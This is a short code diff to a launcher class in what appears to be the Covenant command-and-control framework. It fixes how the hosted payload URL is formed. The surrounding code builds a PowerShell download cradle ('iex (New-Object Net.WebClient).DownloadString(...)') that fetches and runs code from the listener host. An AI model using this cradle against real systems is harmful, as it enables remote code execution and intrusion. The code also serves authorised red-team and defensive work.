@@ -3,6 +3,7 @@
 // License: GNU GPLv3
 
 using System;
+using System.Linq;
 using Microsoft.CodeAnalysis;
 
 using Covenant.Models.Grunts;
@@ -58,7 +59,7 @@ namespace Covenant.Models.Launchers
             HttpListener httpListener = (HttpListener)listener;
             if (httpListener != null)
             {
-				Uri hostedLocation = new Uri(httpListener.Urls + hostedFile.Path);
+				Uri hostedLocation = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
                 string code = "iex (New-Object Net.WebClient).DownloadString('" + hostedLocation + "')";
                 this.LauncherString = GetLauncher(code);
                 return this.LauncherString;
